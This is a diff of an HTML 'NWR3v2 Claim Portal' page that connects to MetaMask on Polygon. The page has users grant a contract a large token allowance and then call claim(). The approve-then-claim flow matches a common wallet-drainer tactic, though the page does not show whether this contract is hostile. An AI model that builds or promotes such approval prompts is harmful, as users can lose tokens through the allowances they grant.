@@ -1,88 +1,111 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
+  <meta charset="UTF-8" />
   <title>🚀 NWR3v2 Claim Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body { background:#111; color:#afa; font-family:sans-serif; text-align:center; padding:50px; }
     button { padding:12px 24px; font-size:1rem; margin:10px; border:none; border-radius:6px; cursor:pointer; }
     #connect { background:#1E90FF; color:#fff; }
     #approve { background:#FFA500; color:#fff; }
-    #claim   { background:#28a745; color:#fff; }
-    #status  { margin-top:20px; font-size:1.1rem; }
+    #claim { background:#28a745; color:#fff; }
+    #status { margin-top:20px; font-size:1.1rem; }
   </style>
 </head>
 <body>
+  <h1>🚀 NWR3v2 Claim Portal</h1>
+  <button id="connect">Connect MetaMask</button><br/>
+  <button id="approve" disabled>⚙️ Approve Tokens</button>
+  <button id="claim" disabled>💧 Claim Now</button>
+  <div id="status"></div>
 
-<h1>🚀 NWR3v2 Claim Portal</h1>
-<button id="connect">Connect MetaMask</button><br/>
-<button id="approve" disabled>⚙ Approve Tokens</button>
-<button id="claim" disabled>💧 Claim Now</button>
-<div id="status"></div>
+  <!-- Ethers.js UMD via CDN -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
 
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
-<script>
-const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
-const TOKEN_ADDRESS    = "0x65ca48d3D1d7356EC99cE6BD3736B54eFdfA837E";
-const CLAIM_ABI = ["function claimNWR3v2() external"];
-const ERC20_ABI = [
-  "function approve(address,uint256) external returns(bool)",
-  "function allowance(address,address) view returns(uint256)"
-];
+  <script>
+    const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48"; // Replace if needed
+    const TOKEN_ADDRESS = "0x3ba911e0B1000b9c5213ab978d3bD8f1efa4fC28";   // NWR3v2 token
+    const POLYGON_CHAIN_ID = 137;
 
-let provider, signer, contract, tokenContract, decimals;
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    let signer, contract;
 
-const btnConnect = document.getElementById("connect");
-const btnApprove = document.getElementById("approve");
-const btnClaim   = document.getElementById("claim");
-const statusEl   = document.getElementById("status");
+    const abi = [
+      "function claim() external",
+      "function decimals() view returns (uint8)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
 
-btnConnect.onclick = async () => {
-  try {
-    provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    const network = await provider.getNetwork();
-    if (network.chainId !== 137) {
-      statusEl.innerText = "⚠️ Switch to Polygon mainnet!";
-      return;
+    const btnConnect = document.getElementById("connect");
+    const btnApprove = document.getElementById("approve");
+    const btnClaim = document.getElementById("claim");
+    const statusDiv = document.getElementById("status");
+
+    async function init() {
+      if (!window.ethereum) {
+        statusDiv.innerText = "MetaMask not detected";
+        return;
+      }
+      btnConnect.onclick = connectWallet;
+      btnApprove.onclick = approveTokens;
+      btnClaim.onclick = claimTokens;
+      window.ethereum.on("accountsChanged", () => resetUI());
     }
-    signer = await provider.getSigner();
-    contract = new ethers.Contract(CONTRACT_ADDRESS, CLAIM_ABI, signer);
-    tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
-    decimals = 18; // assume 18
-    btnApprove.disabled = false;
-    statusEl.innerText = "✅ Connected (18 decimals assumed)";
-  } catch (e) {
-    console.error(e);
-    statusEl.innerText = "❌ Connection failed.";
-  }
-};
 
-btnApprove.onclick = async () => {
-  try {
-    const amt = ethers.parseUnits("1000000000", decimals); // 1e9 * 10^18
-    const tx = await tokenContract.approve(CONTRACT_ADDRESS, amt);
-    await tx.wait();
-    statusEl.innerText = "✅ Approved!";
-    btnClaim.disabled = false;
-  } catch (e) {
-    console.error(e);
-    statusEl.innerText = "❌ Approval error.";
-  }
-};
+    async function connectWallet() {
+      try {
+        await provider.send("eth_requestAccounts", []);
+        signer = await provider.getSigner();
+        const network = await provider.getNetwork();
+        if (network.chainId !== POLYGON_CHAIN_ID) {
+          statusDiv.innerText = "⚠️ Switch to Polygon mainnet!";
+          return;
+        }
+        contract = new ethers.Contract(CONTRACT_ADDRESS, abi, signer);
+        statusDiv.innerText = "✅ Connected";
+        btnApprove.disabled = false;
+        btnConnect.disabled = true;
+      } catch {
+        statusDiv.innerText = "Connection failed.";
+      }
+    }
 
-btnClaim.onclick = async () => {
-  try {
-    // Optionally check allowance...
-    const tx = await contract.claimNWR3v2();
-    await tx.wait();
-    statusEl.innerText = "🎉 Claimed!";
-  } catch (e) {
-    console.error(e);
-    statusEl.innerText = "❌ Claim failed.";
-  }
-};
-</script>
+    async function approveTokens() {
+      try {
+        const token = new ethers.Contract(TOKEN_ADDRESS, abi, signer);
+        const decimals = await token.decimals();
+        const max = ethers.parseUnits("1000000", decimals);
+        const tx = await token.approve(CONTRACT_ADDRESS, max);
+        statusDiv.innerText = "Approving...";
+        await tx.wait();
+        statusDiv.innerText = "✅ Approved! You can now claim.";
+        btnClaim.disabled = false;
+      } catch (err) {
+        statusDiv.innerText = "❌ Approval failed: " + (err.message || err);
+      }
+    }
 
+    async function claimTokens() {
+      try {
+        const tx = await contract.claim();
+        statusDiv.innerText = "Claiming...";
+        await tx.wait();
+        statusDiv.innerText = "🎉 Claim successful!";
+      } catch (err) {
+        statusDiv.innerText = "❌ Claim failed: " + (err.message || err);
+      }
+    }
+
+    function resetUI() {
+      btnConnect.disabled = false;
+      btnApprove.disabled = true;
+      btnClaim.disabled = true;
+      statusDiv.innerText = "";
+    }
+
+    init();
+  </script>
 </body>
 </html>
